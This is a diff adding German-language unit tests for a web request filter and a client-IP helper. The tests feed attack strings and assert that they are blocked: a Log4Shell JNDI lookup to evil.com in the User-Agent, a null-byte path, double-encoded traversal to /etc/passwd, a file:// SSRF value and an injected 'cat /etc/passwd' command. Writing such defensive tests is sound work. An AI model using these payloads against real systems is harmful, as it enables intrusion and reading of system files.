@@ -71,3 +71,56 @@ test("clientIp liest x-forwarded-for (erste IP)", () => {
   const h = new Map([["x-forwarded-for", "203.0.113.9, 10.0.0.1"]]);
   assert.equal(clientIp((n) => h.get(n) ?? null), "203.0.113.9");
 });
+
+test("clientIp bevorzugt vertrauenswürdiges x-real-ip (Anti-Spoofing)", () => {
+  // Angreifer prependet fremde IP in x-forwarded-for → x-real-ip (Vercel) gewinnt.
+  const h = new Map([
+    ["x-forwarded-for", "1.1.1.1"],
+    ["x-real-ip", "203.0.113.50"],
+  ]);
+  assert.equal(clientIp((n) => h.get(n) ?? null), "203.0.113.50");
+});
+
+test("Log4Shell im User-Agent wird blockiert", () => {
+  const u = bewerteAnfrage(
+    { ...basis, ip: "6.1.0.1", pathname: "/", ua: "${jndi:ldap://evil.com/x}" },
+    NOW,
+  );
+  assert.equal(u?.reason, "header_injection");
+});
+
+test("Null-Byte im Pfad wird blockiert", () => {
+  const u = bewerteAnfrage({ ...basis, ip: "6.1.0.2", pathname: "/datei%00.png" }, NOW);
+  assert.ok(u?.block);
+});
+
+test("doppelt kodierte Traversal wird blockiert", () => {
+  const u = bewerteAnfrage(
+    { ...basis, ip: "6.1.0.3", pathname: "/x/%252e%252e%252fetc/passwd" },
+    NOW,
+  );
+  assert.ok(u?.block);
+});
+
+test("SSRF/Command-Injection im Query wird blockiert", () => {
+  assert.ok(
+    bewerteAnfrage({ ...basis, ip: "6.1.0.4", pathname: "/", search: "?url=file:///etc/passwd" }, NOW)?.block,
+  );
+  assert.ok(
+    bewerteAnfrage({ ...basis, ip: "6.1.0.5", pathname: "/", search: "?x=;cat%20/etc/passwd" }, NOW)?.block,
+  );
+});
+
+test("normaler Browser-UA löst KEINEN header_injection aus", () => {
+  const u = bewerteAnfrage(
+    {
+      ...basis,
+      ip: "6.1.0.6",
+      pathname: "/dashboard",
+      ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+      referer: "https://werkpair.example/kandidaten",
+    },
+    NOW,
+  );
+  assert.equal(u, null);
+});
